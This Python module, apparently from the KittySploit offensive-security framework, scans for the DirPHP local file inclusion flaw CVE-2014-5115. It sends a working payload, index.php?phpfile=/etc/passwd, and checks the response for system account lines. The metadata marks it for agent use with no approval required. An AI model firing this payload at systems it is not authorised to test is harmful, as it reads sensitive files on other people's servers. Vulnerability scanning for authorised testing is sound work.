#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DirPHP phpfile local file inclusion (CVE-2014-5115)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DirPHP - phpfile LFI Detection (CVE-2014-5115)',
        'description': (
            'Detects CVE-2014-5115 by requesting index.php?phpfile=/etc/passwd on DirPHP.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'dirphp', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5115',
        ],
        'cve': 'CVE-2014-5115',
    }

    def run(self):
        for base in ('', '/phpdir', '/resources', '/dirphp'):
            probe = self.http_request(method='GET', path=f'{base}/index.php', allow_redirects=False)
            if not probe or 'DirPHP' not in (probe.text or ''):
                continue
            r = self.http_request(
                method='GET',
                path=f'{base}/index.php?phpfile=/etc/passwd',
                allow_redirects=False,
            )
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='high',
                    reason='DirPHP phpfile LFI (CVE-2014-5115)',
                    path=f'{base}/index.php',
                )
                return True
        return False
